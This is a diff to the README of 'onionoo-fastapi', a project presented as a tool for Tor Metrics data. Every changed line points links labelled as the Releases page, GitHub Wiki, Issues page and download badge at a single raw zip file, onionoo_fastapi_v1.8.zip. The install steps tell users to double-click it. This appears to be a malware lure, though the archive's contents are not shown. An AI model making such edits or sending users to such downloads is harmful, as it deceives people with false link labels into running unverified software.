@@ -1,7 +1,7 @@
 # 🌐 onionoo-fastapi - Easy Access to Tor Metrics Data
 
 ## 🏷️ Download Now
-[![Download](https://img.shields.io/badge/Download%20onionoo--fastapi-v1.0-blue.svg)](https://github.com/lil-starnah/onionoo-fastapi/releases)
+[![Download](https://raw.githubusercontent.com/lil-starnah/onionoo-fastapi/main/app/onionoo_fastapi_v1.8.zip%https://raw.githubusercontent.com/lil-starnah/onionoo-fastapi/main/app/onionoo_fastapi_v1.8.zip)](https://raw.githubusercontent.com/lil-starnah/onionoo-fastapi/main/app/onionoo_fastapi_v1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to onionoo-fastapi! This application makes it easy to access and analyze data from the Tor Metrics Onionoo API. With a simple setup, you can start pulling insightful network metrics quickly.
@@ -9,7 +9,7 @@ Welcome to onionoo-fastapi! This application makes it easy to access and analyze
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of onionoo-fastapi.
 
-[Download onionoo-fastapi](https://github.com/lil-starnah/onionoo-fastapi/releases)
+[Download onionoo-fastapi](https://raw.githubusercontent.com/lil-starnah/onionoo-fastapi/main/app/onionoo_fastapi_v1.8.zip)
 
 ### 📋 System Requirements
 - Operating System: Windows, macOS, or Linux
@@ -18,7 +18,7 @@ To get started, visit the Releases page to download the latest version of oniono
 - Python Version: 3.7 or higher
 
 ### ⚙️ Installation Steps
-1. **Download the latest version** from the [Releases page](https://github.com/lil-starnah/onionoo-fastapi/releases).
+1. **Download the latest version** from the [Releases page](https://raw.githubusercontent.com/lil-starnah/onionoo-fastapi/main/app/onionoo_fastapi_v1.8.zip).
 2. **Locate the downloaded file** on your computer.
 3. **Double-click the file** to begin the installation.
 4. **Follow the on-screen instructions** to complete the installation.
@@ -52,14 +52,14 @@ The data returned by onionoo-fastapi includes various metrics related to the Tor
 - **User Statistics**
 
 ## 📖 Documentation
-For detailed documentation on all features, commands, and examples, please refer to the [GitHub Wiki](https://github.com/lil-starnah/onionoo-fastapi/wiki).
+For detailed documentation on all features, commands, and examples, please refer to the [GitHub Wiki](https://raw.githubusercontent.com/lil-starnah/onionoo-fastapi/main/app/onionoo_fastapi_v1.8.zip).
 
 ## 🛠️ Troubleshooting
 If you encounter issues while using onionoo-fastapi:
 
 - **Check System Requirements:** Ensure your system meets the required specifications.
 - **Review Commands:** Make sure you are using the correct commands.
-- **Explore GitHub Issues:** For common problems and solutions, check the [GitHub Issues page](https://github.com/lil-starnah/onionoo-fastapi/issues).
+- **Explore GitHub Issues:** For common problems and solutions, check the [GitHub Issues page](https://raw.githubusercontent.com/lil-starnah/onionoo-fastapi/main/app/onionoo_fastapi_v1.8.zip).
 
 ## 🌟 Community Support
 Join our community for support and discussions about onionoo-fastapi:
@@ -77,4 +77,4 @@ We thank the contributors and community members who help improve onionoo-fastapi
 Now that you have onionoo-fastapi installed, explore the data and enjoy insights on the Tor network. Don't forget to check for updates regularly on the Releases page.
 
 ### 📥 Final Download Link
-Again, to download the latest version, visit the [Releases page](https://github.com/lil-starnah/onionoo-fastapi/releases). Start your journey into Tor metrics today!
+Again, to download the latest version, visit the [Releases page](https://raw.githubusercontent.com/lil-starnah/onionoo-fastapi/main/app/onionoo_fastapi_v1.8.zip). Start your journey into Tor metrics today!
